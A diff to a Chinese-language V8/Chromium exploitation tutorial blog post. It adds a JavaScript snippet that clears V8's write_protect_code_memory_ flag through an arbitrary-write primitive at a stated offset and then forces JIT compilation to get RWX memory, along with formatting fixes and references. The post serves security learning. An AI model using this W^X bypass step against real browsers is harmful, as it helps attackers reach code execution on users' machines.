@@ -39,7 +39,8 @@ title: V8 - PWN Chromium 0x00 - Starting with OOB
 > [!info]
 >
 > 1. JS 源码通过 **parser（分析器）转化为 AST（抽象语法树）**，再经过 **interpreter（解释器）解析为 bytecode（字节码）**
-> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）** > ![V8-image03](static/V8-image03.png)
+> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）**
+> ![V8-image03](static/V8-image03.png)
 
 可以把重点放在 AST 之后，其中优化的矛盾点在于：JS 代码可以在 **字节码** 或者优化后的 **机器码** 状态下执行，而生成字节码速度很 **快**，生成机器码就要 **慢** 一些。
 
@@ -1098,7 +1099,34 @@ In file: /v8/new_v8/v8/src/heap/heap.cc:5377
    5382   uint64_t new_hash_seed;
 ```
 
-在当前的命名空间下，就可以直接用 `p &write_protect_code_memory_` 指令找到该标志位的地址，计算出它在 V8 堆上的相对偏移。
+在当前的命名空间下，就可以直接用 `p &write_protect_code_memory_` 指令找到该标志位的地址，计算出它在 V8 堆上的相对偏移，我本地得到的偏移是 `0x9a08`。
+
+- 触发 JIT 获得 RWX 内存：
+
+接下来仅需构造：
+
+```javascript
+let exp = () => {
+  function jit_func() {
+    return [0.1];
+  }
+
+  limited_write(0x9a08, 0n);
+
+  for (let i = 0; i < 0x400000; i++) {
+    jit_func();
+  }
+}
+```
+
+此时就已经获得了 RWX 权限的 JIT 内存，再用任意读写去获得 `jit_func` 地址就能根据偏移算出 JIT 内存的位置，最终实现利用。
+
+不过这里经过 JIT 优化的过程中也触发了 gc，弄乱了原先的内存布局，因此需要重新构造任意读写。
+
+---
+
+> [!todo] 
+> 这篇博客作为 V8 漏洞利用的入门至此就结束了，后面会结合 GC、JIT（turbofan / maglev）、wasm、SBX 等不同知识点进行更深入的学习。
 
 ---
 
@@ -1106,4 +1134,5 @@ In file: /v8/new_v8/v8/src/heap/heap.cc:5377
 
 1. [Exploiting CVE-2021-21225 and disabling W^X](https://tiszka.com/blog/CVE_2021_21225_exploit.html) . *[tiszka](https://tiszka.com/)*
 2. [v8 pwn入门篇利用合集](https://blog.csdn.net/qq_61670993/article/details/135316299) . *[XiaozaYa](https://blog.csdn.net/qq_61670993)*
-3. [V8 沙箱绕过](https://tttang.com/archive/1443/) . *[Jayl1n](https://tttang.com/user/Jayl1n)*
+3. [Chrome v8 pwn](https://blog.csdn.net/qq_45323960/article/details/130124693) . *[sky123](https://sky123.blog.csdn.net/?type=blog)*
+4. [V8 沙箱绕过](https://tttang.com/archive/1443/) . *[Jayl1n](https://tttang.com/user/Jayl1n)*
